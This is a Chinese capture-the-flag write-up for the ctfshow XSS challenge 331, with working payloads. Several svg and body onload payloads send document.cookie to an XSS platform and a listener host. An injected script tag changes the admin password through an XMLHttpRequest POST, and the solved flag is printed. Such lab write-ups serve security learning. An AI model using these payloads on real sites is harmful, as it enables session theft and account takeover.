

# ctfshow-xss331



##### 参考链接

其他大佬链接

feng  https://ego00.blog.csdn.net/article/details/114079028

Y4	 https://blog.csdn.net/solitudi/article/details/111568030?spm=1001.2014.3001.5501

bit   https://www.xl-bit.cn/index.php/archives/120/



```
欢迎你登陆ctfshow

用户名
请输入用户名
密码
请输入密码
密码必须大于6位

```



```javascript
javascript发送Http请求，XMLHttpRequest

var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
httpRequest.open('POST', 'url', true); //第二步：打开连接
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
httpRequest.send('name=teswe&ee=ef');//发送请求 将情头体写在send中
/**
 * 获取数据后的处理程序
 */
httpRequest.onreadystatechange = function () {//请求后的回调接口，可将请求成功后要执行的程序写在其中
    if (httpRequest.readyState == 4 && httpRequest.status == 200) {//验证请求是否发送成功
        var json = httpRequest.responseText;//获取到服务端返回的数据
        console.log(json);
    }
};



2 jquery  ajax 发送post 
<script>$.ajax({url:'api/change.php',type:'post',data:{p:'1234567'}});</script>
```



```html
既然前面是反射型xss  其实不管它是反射还是存储 
主要还是需要我们利用xss平台 获取cookie


xss平台
https://ww.rs/
https://hk.sb/


输入框输入
<Img sRC=//hk.sb/UfVb/test.jpg>

后面用了buu的公开靶机当个nc监听的服务器  花生壳内网穿透也可以 nc
nc -lvp 1104
正常的vps那边是需要nc的，但是nc好像不能持续接收，但是方法其实很多，可以重复起nc，或者我这边就临时拿python起一个临时的服务器，接收一下get参数：
python -m http.server 1104
<svg/onload="window.open('https://hk.sb/y7xx'+document.cookie)">
<body/onload="window.open('https://hk.sb/y7xx'+document.cookie)">

<svg/onload="window.open('http://node4.buuoj.cn:1104/'+document.cookie)">
    <svg	onload="window.open('http://3e8366a0-4e63-4eec-963d-6fa92cad126e.node4.buuoj.cn:1104/'+document.cookie)">
     
 
 直接拿到管理员的cookie也没法成功登录。由于设置了cookie发给你后就让他失效，所以没法登录成admin。
但是可以想办法把那个页面的内容给直接读到
  这次多了个更改密码的功能  提示可以更改管理员密码
  改成了POST更改密码 所以不能用window了
 
 先注册
 用户名  <script>var httpRequest = new XMLHttpRequest();httpRequest.open('POST', 'http://127.0.0.1/api/change.php', true);httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpRequest.send('p=1234567');</script>
 密码		test
 重复密码	test
 
 还是吃了不会javascript的亏 后续一定记得看javascript
innerHTML和outerHTML的区别
1）innerHTML:
　　从对象的起始位置到终止位置的全部内容,不包括Html标签。
2）outerHTML:
　　除了包含innerHTML的全部内容外, 还包含对象标签本身。


            
修改密码过后登录        

在用户管理可以查看到flag        
欢迎你，admin ctfshow{e1eed59f-08a5-411e-a375-6cf9d82a79c0}        
        
        
        
        
        
        
    
        
        
           
```

